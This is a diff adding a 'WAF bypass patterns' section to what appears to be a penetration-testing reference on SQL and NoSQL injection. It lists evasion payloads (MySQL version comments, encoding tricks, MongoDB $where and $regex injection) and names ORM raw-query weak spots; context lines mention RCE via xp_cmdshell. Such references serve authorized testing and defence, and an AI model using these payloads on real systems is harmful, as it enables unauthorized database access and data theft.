@@ -150,3 +150,36 @@
 | Auth bypass | Login as admin without valid credentials |
 | File read | LOAD_FILE or equivalent to read server files |
 | RCE | xp_cmdshell, INTO OUTFILE to webroot, COPY TO PROGRAM |
+
+## Advanced WAF Bypass Patterns
+
+### Comment-Based Bypasses
+- `/*!50000UNION*/+/*!50000SELECT*/` (MySQL version comments)
+- `UNION/**/SELECT` → `UN/**/ION/**/SE/**/LECT`
+- `1'/**/OR/**/1=1--`
+
+### Encoding Bypasses
+- Hex encoding: `0x756E696F6E2073656C656374` (union select)
+- Double URL encoding: `%2527` → `%27` → `'`
+- Unicode: `ʼ` (U+02BC) sometimes passes as quote
+
+### Alternative Syntax
+- `UNION ALL SELECT` instead of `UNION SELECT`
+- `GROUP BY` / `HAVING` for error-based extraction
+- `ORDER BY` injection for blind extraction
+- `HANDLER ... READ` (MySQL) instead of SELECT
+- JSON functions: `JSON_EXTRACT()`, `->` operator (MySQL 5.7+)
+
+### NoSQL Injection (MongoDB Extended)
+- `{"$gt":""}` on password fields
+- `{"$regex":"^a"}` for character-by-character extraction
+- `{"$where":"this.password.match(/^a/)"}` JS injection
+- `{"$lookup":{"from":"users","localField":"_id","foreignField":"_id","as":"x"}}` aggregate injection
+- Prototype pollution via `__proto__` in query objects
+
+### ORM-Specific Bypasses
+- Sequelize: raw queries via `sequelize.literal()` or `Sequelize.fn()`
+- Prisma: `$queryRaw` and `$executeRaw` with template literal misuse
+- Mongoose: operator injection via `{$gt: ""}` in query parameters
+- TypeORM: `createQueryBuilder` with string interpolation
+- Django: `extra()`, `raw()`, `RawSQL()` — all bypass ORM protection
